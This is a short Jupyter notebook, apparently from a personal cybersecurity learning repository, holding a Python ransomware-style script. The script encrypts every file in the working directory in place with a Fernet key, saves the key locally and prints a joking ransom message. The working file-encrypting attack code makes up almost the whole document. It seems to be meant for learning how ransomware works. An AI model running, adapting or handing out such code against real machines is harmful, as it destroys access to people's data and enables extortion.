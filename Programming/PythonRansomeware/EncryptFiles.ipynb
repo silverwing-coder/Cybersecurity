{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<h3>File Encryption</h3>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "#!/usr/bin/env python3\n",
    "\n",
    "import os\n",
    "from cryptography.fernet import Fernet\n",
    "\n",
    "files = []\n",
    "for file in os.listdir():\n",
    "    if file == \"encrypt.py\" or file== \"decrypt.py\" or file == \"mykey.key\":\n",
    "        continue\n",
    "\n",
    "    if os.path.isfile(file):\n",
    "        files.append(file)\n",
    "\n",
    "# print(files)\n",
    "\n",
    "key = Fernet.generate_key()\n",
    "with open(\"mykey.key\", \"wb\") as mykey:\n",
    "    mykey.write(key)\n",
    "\n",
    "for file in files:\n",
    "    with open(file, \"rb\") as thefile:\n",
    "        contents = thefile.read()\n",
    "    encrypted = Fernet(key).encrypt(contents)\n",
    "    # print(encrypted)\n",
    "\n",
    "    with open(file, \"wb\") as thefile:\n",
    "        thefile.write(encrypted)\n",
    "\n",
    "\n",
    "print(\"Encrypted!\")\n",
    "print(files)\n",
    "\n",
    "print(\"Dear Dude. Your files are encrypted. If you want to decrypt them, treat me a coffee! at Den.\")"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.10.5 64-bit",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "name": "python",
   "version": "3.10.5"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "826bbc0456aa5c9ad77f7d90256c442d489e70b4f04d159d205e9b6d80c05621"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
